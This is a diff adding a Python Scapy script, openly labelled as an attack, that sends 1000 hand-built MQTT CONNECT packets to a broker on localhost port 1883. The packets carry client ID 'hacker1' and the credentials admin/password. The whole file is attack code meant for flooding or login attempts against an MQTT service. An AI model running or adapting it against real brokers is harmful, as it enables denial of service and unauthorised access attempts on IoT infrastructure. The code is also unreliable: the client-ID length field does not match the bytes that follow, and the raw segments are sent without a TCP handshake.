@@ -1,0 +1,29 @@
+from scapy.all import IP, TCP, Raw, send, RandShort
+
+# MQTT raw payload for CONNECT packet
+mqtt_connect_packet = bytes([
+    0x10, 0x1A,
+    0x00, 0x04,
+    0x4D, 0x51, 0x54, 0x54,
+    0x04,
+    0xC0,
+    0x00, 0x3C,
+    0x00, 0x06,
+    0x68, 0x61, 0x63, 0x6B, 0x65, 0x72, 0x31,
+    0x00, 0x05,
+    0x61, 0x64, 0x6D, 0x69, 0x6E,
+    0x00, 0x08,
+    0x70, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72, 0x64
+])
+
+target_ip = "127.0.0.1"
+target_port = 1883
+
+print(f"🚀 Sending multiple MQTT CONNECT packets to {target_ip}:{target_port}")
+
+for i in range(1000):
+    pkt = IP(dst=target_ip) / TCP(dport=target_port, sport=RandShort()) / Raw(load=mqtt_connect_packet)
+    send(pkt, verbose=False)
+    print(f"📤 Packet {i+1} sent")
+
+print("✅ Attack complete!")
